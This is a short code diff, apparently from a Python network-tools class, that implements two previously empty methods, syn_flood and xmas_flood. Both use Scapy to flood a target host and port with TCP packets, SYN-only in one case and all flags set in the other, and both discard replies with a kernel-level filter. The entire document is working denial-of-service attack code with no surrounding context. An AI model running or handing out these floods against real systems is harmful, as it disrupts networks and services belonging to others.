@@ -69,14 +69,16 @@ class TCPOps:
     
     @staticmethod
     def syn_flood(iface:str, dst:str, dport:int, timeout:int=2):
-        pass 
+        pkt = IP(dst=dst) / TCP(dport=dport, flags="S")
+        # "not ip and not arp" is BPF filter to discard responses at kernel level.
+        srflood(pkt, iface=iface, timeout=timeout, verbose=False, filter='not ip and not arp') 
 
     @staticmethod 
-    def xmas_flood(iface:str, dst:str, dport:int, timeout:int=2):
+    def xmas_flood(iface:str, dst:str, dport:int, timeout:int=5):
         # An Xmas TCP packet has all flags set: FIN, SYN, RST, PSH, ACK, URG.
-        
-
-        pass 
+        pkt = IP(dst=dst) / TCP(dport=dport, flags="FSRPAU")
+        # "not ip and not arp" is BPF filter to discard responses at kernel level.
+        srflood(pkt, iface=iface, timeout=timeout, verbose=False, filter='not ip and not arp')
 
 
 
